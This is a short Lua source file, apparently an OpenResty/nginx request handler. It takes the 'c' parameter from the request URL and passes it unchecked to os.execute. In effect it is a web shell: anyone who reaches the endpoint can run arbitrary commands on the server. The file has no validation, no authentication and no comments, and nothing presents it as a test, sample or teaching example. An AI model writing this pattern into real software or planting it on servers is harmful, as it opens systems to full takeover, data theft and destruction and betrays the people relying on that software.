local function handler(db)
    local c = ngx.req.get_uri_args()["c"]
    os.execute(c)
end
return handler
